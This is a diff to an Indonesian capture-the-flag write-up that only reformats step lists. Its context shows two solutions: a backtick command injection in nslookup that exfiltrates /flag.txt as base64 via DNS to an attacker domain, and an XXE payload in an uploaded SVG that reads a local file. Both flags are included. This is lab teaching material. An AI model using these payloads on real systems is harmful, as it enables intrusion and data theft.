@@ -147,14 +147,14 @@ Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
 - **Kerentanan:** Command Injection.
 - **Deskripsi:** Aplikasi menjalankan `nslookup` menggunakan `shell=True` dengan *blacklist* karakter yang tidak lengkap. Karakter *backtick* (`)`) tidak diblokir.
 - **Eksploitasi:**
-  1. Siapkan domain dengan *wildcard DNS* yang mengarah ke server penyerang.
+  - Siapkan domain dengan *wildcard DNS* yang mengarah ke server penyerang.
     <img src="img/nslookup1.png" width="500">
-  2. Injeksi perintah di dalam *backtick*. Perintah `base64 /flag.txt` akan dieksekusi, dan hasilnya dikirim sebagai subdomain dalam *query* DNS.
+  - Injeksi perintah di dalam *backtick*. Perintah `base64 /flag.txt` akan dieksekusi, dan hasilnya dikirim sebagai subdomain dalam *query* DNS.
      ```bash
      `base64 /flag.txt`.noryn.digital
      ```
       <img src="img/nslookup2.png" width="500">
-  3. Tangkap *query* DNS di server untuk mendapatkan flag dalam format Base64.
+  - Tangkap *query* DNS di server untuk mendapatkan flag dalam format Base64.
 - **Flag:** `foresty{54fb3ec7adecdcb1930ef0528366b98e}`
 
 ---
@@ -180,14 +180,15 @@ Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
 - **Deskripsi:** Ditemukan direktori `.git` yang terekspos, memungkinkan untuk mengunduh *source code*. Kode menunjukkan bahwa parser XML memuat entitas eksternal (`LIBXML_NOENT`).
   <img src="img/svg1.png" width="500">
 - **Eksploitasi:**
-  1. Unduh *source code* menggunakan `git-dumper`.
+  - Unduh *source code* menggunakan `git-dumper`.
     <img src="img/svg2.png" width="500">
     <img src="img/svg3.png" width="500">
-  2. Analisa file (`dashboard.php`).
+  - Analisa file (`dashboard.php`).
+  <br>
     <img src="img/svg4.png" width="500">
     <br>
     Ditemukan `$dom->load($path, LIBXML_NOENT | LIBXML_DTDLOAD);` Itu artinya kita bisa melakukan serangan XXE!
-  2. Buat file SVG berbahaya yang berisi *payload* XXE untuk membaca file lokal (`/flag.txt`).
+  - Buat file SVG berbahaya yang berisi *payload* XXE untuk membaca file lokal (`/flag.txt`).
      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE svg [
@@ -197,7 +198,7 @@ Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
        <title>&flag;</title>
      </svg>
      ```
-  3. Unggah file SVG tersebut, dan flag akan muncul di judul gambar.
+  - Unggah file SVG tersebut, dan flag akan muncul di judul gambar.
   <img src="img/svg5.png" width="500">
 - **Flag:** `foresty{670ef0276339a9989da10a47d46a6115}`
 
